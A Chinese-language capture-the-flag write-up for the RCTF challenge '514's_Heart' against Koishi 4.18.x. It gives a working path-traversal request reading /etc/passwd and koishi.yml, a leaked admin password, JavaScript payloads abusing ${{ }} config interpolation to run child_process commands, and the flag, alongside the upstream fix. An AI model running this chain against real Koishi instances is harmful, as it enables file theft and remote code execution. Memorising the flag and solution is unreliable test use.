# 514's_Heart

## 题目简述

题目运行 Koishi 4.18.x，并启用了 `@koishijs/plugin-console`、`auth`、`config`、`explorer` 等插件。初始用户没有读取根目录 flag 的权限，但旧版 console 插件的资源路由存在任意文件读取；读取 `koishi.yml` 可取得后台管理员密码。登录后，再利用 Koishi 配置中的 `${{ ... }}` 插值执行 JavaScript，把 `/readflag` 的输出写到 Explorer 可读取的位置。

## 解题过程

### 利用 console 插件读取任意文件

旧版 `@koishijs/plugin-console` 处理 `/@plugin-<key>/...` 路径时，大致执行：

```typescript
if (name.startsWith('@plugin-')) {
  const [key] = name.slice(8).split('/', 1)
  if (this.entries[key]) {
    const files = makeArray(this.getFiles(this.entries[key].files))
    const filename = files[0] + name.slice(8 + key.length)
    ctx.type = extname(filename)
    if (this.config.devMode || ctx.type !== 'application/javascript') {
      return sendFile(filename)
    }
    // JavaScript 文件才会进入后续转换逻辑
  }
}
```

问题在于 URL 余下部分未经规范化和目录边界校验便直接拼到 `files[0]`。只要目标不是 JavaScript，代码就会把拼出的路径交给 `sendFile()`。因此可先请求 `/etc/passwd` 验证漏洞：

```http
GET /@plugin-<runtime-key>/../../../../../../../etc/passwd HTTP/1.1
Host: <challenge-host>:5140
```

`<runtime-key>` 是当前实例在前端资源 URL 中使用的插件键，不应照抄 WP 中某一次部署的随机值。确认目录穿越后，用同样方式读取 Koishi 工作目录下的 `koishi.yml`。

### 从配置中取得管理员凭据

Koishi 把插件实例及其参数集中写在 `koishi.yml`。题目配置的 `auth` 段包含明文管理员密码：

```yaml
auth:<instance-id>:
  admin:
    hint: >-
      ... try to rce without adding any plugins ...
    password: rctf2025gogogotorce
```

这一步同时给出两个信息：已有账号可以登录控制台；预期解法不能依赖安装恶意插件或访问外网，而应寻找现有插件中的代码执行面。

### 通过配置插值执行 JavaScript

Koishi loader 会递归遍历配置；遇到字符串时，用正则提取 `${{ ... }}`，再通过 `new Function` 创建的求值器在上下文中执行表达式：

```typescript
interpolate(source: any) {
  if (typeof source === 'string') {
    return interpolate(source, this.params, /\$\{\{(.+?)\}\}/g)
  }
  // 数组和对象会继续递归处理
}

const evaluate = new Function('context', 'expr', `
  try {
    with (context) {
      return eval(expr)
    }
  } catch {}
`)
```

后台 `config` 插件允许修改插件配置，过滤条件等字符串字段也会经过上述插值。选择一个可编辑、重载后会重新读取配置的字段，填入：

```javascript
${{ process.mainModule.require('child_process')
    .execSync('/readflag > /koishi/flag') }}
```

若当前上下文不能直接取到 `require`，等价写法是从全局 `process` 的主模块加载器进入：

```javascript
${{ global.process.mainModule.constructor
    ._load('child_process')
    .exec('/readflag > /koishi/flag') }}
```

保存配置并重新加载对应插件后，表达式执行 `/readflag`，输出落到 `/koishi/flag`。随后在已经启用的 Explorer 中打开该文件，得到：

```text
RCTF{You_now_g0t_the_heart_0f_koishi!}
```

该任意文件读取问题赛后已由上游合并修复。修复的核心是先规范化插件相对路径、拒绝 `..` 路径段，并在读取前确认最终路径仍位于允许目录内；具体讨论见 [koishijs/webui#362](https://github.com/koishijs/webui/pull/362)。正文已经给出漏洞成因与修复原则，不需要依赖链接才能理解利用链。

## 方法总结

完整链路是“插件静态资源目录穿越 → 读取集中配置和管理员密码 → 登录现有控制台 → 配置插值代码执行”。目录穿越阶段应避免照抄动态插件键，先从当前页面资源定位实际键；取得配置后，也不要停在凭据泄露，而应继续审计配置加载器是否把字符串当模板或表达式执行。对于这类管理框架，配置本身既是敏感信息集合，也可能是第二阶段执行入口。
